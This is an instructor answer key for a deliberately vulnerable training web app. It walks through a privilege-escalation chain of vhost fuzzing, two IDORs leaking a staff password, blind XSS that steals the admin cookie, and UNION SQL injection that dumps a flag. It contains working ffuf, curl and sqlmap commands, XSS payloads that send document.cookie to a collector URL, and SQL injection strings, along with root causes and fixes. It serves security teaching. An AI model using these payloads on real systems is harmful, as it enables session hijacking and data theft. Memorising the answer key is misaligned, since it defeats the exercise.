# Instructor Notes & Answer Key — DeadDrop Capstone Chain

> خاص بالـ TA فقط. الحل الكامل + verified payloads. كله متجرب وشغّال.
> **Do not hand this to students** — the whole point is that they recover each
> step. The app prints no payloads and no SQL; on-screen hints are deliberately
> shallow. Theme is light (projector-friendly); progress is an anonymous `⚑ n/4`.

## The chain (privilege escalation: customer → support → admin)

```
RECON ─► REGISTER ─► IDOR ×2 ─► LOGIN as support ─► BLIND XSS ─► SQLi ─► FLAG
         (customer)  (steal      (customer_support)  (steal        (admin
                      support                          admin         panel
                      password)                        cookie)       search)
```

**Vhost layout.** The customer site (home, register, login, account, tickets,
`/api/users*`) is on the main host (localhost / `app.deaddrop.local`). The
**staff tools — `/support`, `/support/escalate`, `/admin` — exist ONLY on
`internal.deaddrop.local`**; anywhere else they 404 (and `/admin` on the main
host returns a troll that hints "not on this host"). The internal root is a
**staff portal login**. To drive it in a browser, add a hosts entry:
`127.0.0.1  internal.deaddrop.local` (the IDOR/API recon can be done by IP/Host
header with no hosts entry). Staff log in on the internal vhost, so the session
cookie is scoped to the right host.

Each link gates the next:

- **`/support`** (internal) needs role `support` → log in on the internal portal
  with the **stolen support password** (from the IDOR). Support sees **every
  customer's tickets** (that's the desk's job) plus the escalate form.
- **`/admin`** (internal) needs role `admin` → the only admin session is the
  bot's, so you must **steal its cookie via XSS**. Admin & founder passwords are
  **redacted in the API**, so you *cannot* just log in as admin — no shortcut.
- The **flag is only in the `vault` table**, which no normal query reads → it
  requires the **UNION injection** in the admin search, which needs the admin
  session.

Final flag: `FLAG{ch41n3d_rec0n_id0r_xss_sqli}`

---

## Link 1 — Recon + Fuzzing  (marks `recon`)

**Response-header recon (the intended first move).** The app serves on any host
but names itself in a header. Hitting the raw IP / localhost shows it:
```bash
curl -I http://localhost:5000/
# Server: DeadDrop
# X-Served-By: app.deaddrop.local      <-- canonical vhost
```
Lesson: the backend is **vhost-based** and its domain is `deaddrop.local`. If
there's an `app.` host, there are probably others → go vhost-fuzz. (The home
HTML comment and the footer `hello@deaddrop.local` reinforce the domain; the
comment also hints "staff tools run on their own vhost" without naming it.)
`app.deaddrop.local` and `internal.deaddrop.local` each report their own name in
`X-Served-By`.

**Directory fuzzing** (as in the recon lab):
```bash
ffuf -u http://localhost:5000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -ic -c
```
Finds `/api` → `/api/users` (a list of handles, incl. `customer_support`, `admin`).
Also in `robots.txt` (`Disallow: /api /ticket /admin`).

**Virtual-host fuzzing** (the technique they asked for):
Breadcrumb = the domain `deaddrop.local` leaked in the footer (`hello@deaddrop.local`)
and an HTML comment on `/` ("check the internal vhost"). Fuzz the Host header:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://127.0.0.1:5000/ -H "Host: FUZZ.deaddrop.local" -ac
# unknown vhost -> normal home (~4620 bytes); internal.deaddrop.local -> ~4603 (the odd one).  Manual: -fs 4620
```
View it:
```bash
curl -H "Host: internal.deaddrop.local" http://localhost:5000/
```
Internal is the **DeadDrop staff portal** (a staff login, and once you're in,
links to the support console and admin panel). Finding it tells you staff creds
are the next target. Reaching any `/api/*` or the vhost sets `recon`.

> HUD note: the vhost is a different origin, so vhost recon done purely with
> tools won't tick the browser's counter — opening `/api/users` on localhost does.

---

## Link 2 — Register, then IDOR ×2  (marks `idor`)

1. **Register** any account at `/register` (e.g. `pwn3r` / `hunter2`). You're a
   `customer`. (There is no guest login — this is the realistic "any low-priv
   account is enough" start.)

2. **IDOR #1 — query parameter** `/ticket?id=`. Your own ticket link shows the
   pattern (`?id=<n>`); the activity feed teases other customers' tickets. Walk
   the ids:
   ```
   http://localhost:5000/ticket?id=1      (alice's — not yours)
   ```
   Ticket **#1** carries a support reply from *Amira*: she's a **staff login,
   account #2**, and mentions staff accounts live in a "user directory" (the
   `/api/users` service they saw in recon) → points at IDOR #2. The exact
   endpoint is intentionally not spelled out in the reply. Reading any non-owned
   ticket sets `idor`.

3. **IDOR #2 — REST API** `/api/users/:id`. **How students find the endpoint:**
   the **My account** page (`/account`) loads its profile card client-side with
   `fetch('/api/users/<their-own-id>')`. Anyone watching DevTools → Network (or
   Burp) sees that request, notices the id in the URL, and the own-account JSON
   even echoes their own `password` — so the natural next thought is "change the
   id." The list endpoint (`/api/users`) is recon; the **item** endpoint returns
   the full record **including the password**, with no ownership check. Fetching
   your *own* id does not set `idor`; any other id does:
   ```bash
   curl -b "sid=<your session>" http://localhost:5000/api/users/2
   # -> {"id":2,"handle":"customer_support","role":"support",...,"password":"Amira!Cairo#2024"}
   ```
   `GET /api/users/1` (admin) and `/3` (founder) return
   `"[redacted — managed via SSO]"` → **no admin shortcut**. Only
   `customer_support` (role `support`) advances the chain.

**Creds:** `customer_support` / `Amira!Cairo#2024`

**Root cause:** both endpoints verify a session but never check the object
belongs to the caller. Fix = server-side ownership/authorization check on every
object access. (Bonus discussion: the API over-returns — passwords should never
be in a response at all. Sensitive-data exposure stacked on top of IDOR.)

---

## Link 3 — Log in as support → Blind XSS → steal admin cookie  (marks `xss`)

1. On **`internal.deaddrop.local`** (hosts entry needed), log in at `/login` as
   `customer_support` / `Amira!Cairo#2024` → the support console. It lists every
   customer's tickets and an **escalate to admin** form.
2. Escalating sends a note to the admin, who reviews the queue immediately; the
   queue renders the escalation **raw** → blind XSS in the admin's session.
   Submit (any of these) in the escalate form, callback to the in-app `/collect`
   (reachable on any host) or your own `python3 -m http.server`:
   ```html
   <img src=x onerror="new Image().src='http://localhost:5000/collect?c='+document.cookie">
   ```
   ```html
   <script>fetch('http://localhost:5000/collect?c='+document.cookie)</script>
   ```
3. Within a few seconds the **Intercept** inbox (`/intercept`) shows
   `c=sid=adm_…` — the admin's session.

**Bot mechanics (to debug a student's payload):** `adminReviewQueue()` emulates
a browser — it finds any `http(s)://…` URL in the escalation; if the payload
mentions `document.cookie` it appends the admin cookie (`sid=<ADMIN_SID>`) and
GETs it. So **any URL + `document.cookie` = success**. No real headless browser.
`ADMIN_SID` is random per boot (unguessable → must be stolen). `location` is
also supported (sends the admin URL instead).

**Use it:** open `/intercept` **on internal.deaddrop.local** and hit
**"become them → admin panel"** (it sets `sid` for the internal host, then goes
to `/admin`); or set it by hand in DevTools / curl:
```bash
curl -b "sid=adm_<stolen>" -H "Host: internal.deaddrop.local" http://localhost:5000/admin
```
Only `support`/`admin` can escalate, so a plain customer can't reach this step —
it's gated behind the IDOR. (`/admin` 404-trolls on the main host.)

**Root cause:** escalation rendered unescaped in the admin queue (blind: the
attacker's own confirmation is clean). Fix = contextual output encoding + CSP +
HttpOnly cookies.

---

## Link 4 — Admin panel SQL injection  (marks `sqli`)

As `admin` (stolen cookie), `/admin` opens with a **Member search**:
```sql
SELECT id, handle, role, joined FROM members WHERE handle LIKE '%<q>%'
```
Four columns → UNION with the `vault` table (also 4 cols). The flag is only in
`vault.secret`.

```
zzz' ORDER BY 4--           (ok)   /   zzz' ORDER BY 5--   (error)   -> 4 cols
zzz' UNION SELECT id, label, secret, note FROM vault-- 
```
URL-encoded (browser, on the internal vhost):
```
http://internal.deaddrop.local:5000/admin?q=zzz%27%20UNION%20SELECT%20id,label,secret,note%20FROM%20vault--%20
```
The smuggled row renders as a "member" card; `secret` = `FLAG{ch41n3d_rec0n_id0r_xss_sqli}`.
That sets `sqli`. Submit it at `/flag` to win and sign the Wall of Fame.

sqlmap (with the stolen cookie, against the internal vhost):
```bash
sqlmap -u "http://internal.deaddrop.local:5000/admin?q=a" --cookie="sid=adm_<stolen>" -p q --batch --dump -T vault
```

**Root cause:** string-concatenated query. Fix = parameterized query.

---

## Grading / discussion prompts

1. Root cause + one-line fix for each of: the two IDORs, the XSS, the SQLi.
2. Why is `/admin` **403/trolled** for a logged-in customer *and* support, but
   open to a stolen admin cookie? (authentication vs authorization vs session.)
3. Each bug alone is low/medium severity. Explain why the **chain** is critical
   (a self-registered customer reached full admin). ← the Week-14 objective.
4. **One** fix, placed anywhere in the chain, that breaks the whole attack — is
   there more than one? (Ownership checks? Not returning passwords? Output
   encoding? Parameterized queries? Discuss defense in depth.)

---

## Ops

- Everything in-memory; **restart resets**. `/reset` also clears a player's
  progress, removes registered accounts (id ≥ 6), re-seeds tickets, clears the
  queue + Intercept, and logs out.
- `ADMIN_SID` is random per boot — restart mid-exercise and students must
  re-steal it.
- Fixed accounts: `admin`/`founder` (admin, redacted), `customer_support`
  (`Amira!Cairo#2024`), `alice`/`bob` (customers). Wall of Fame is in-memory for
  the session.
- Port 5000 default; `PORT=5058 npm start` to change.
- Kill a stuck instance (Windows):
  ```powershell
  Get-CimInstance Win32_Process -Filter "Name='node.exe'" |
    Where-Object { $_.CommandLine -like '*server.js*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
  ```
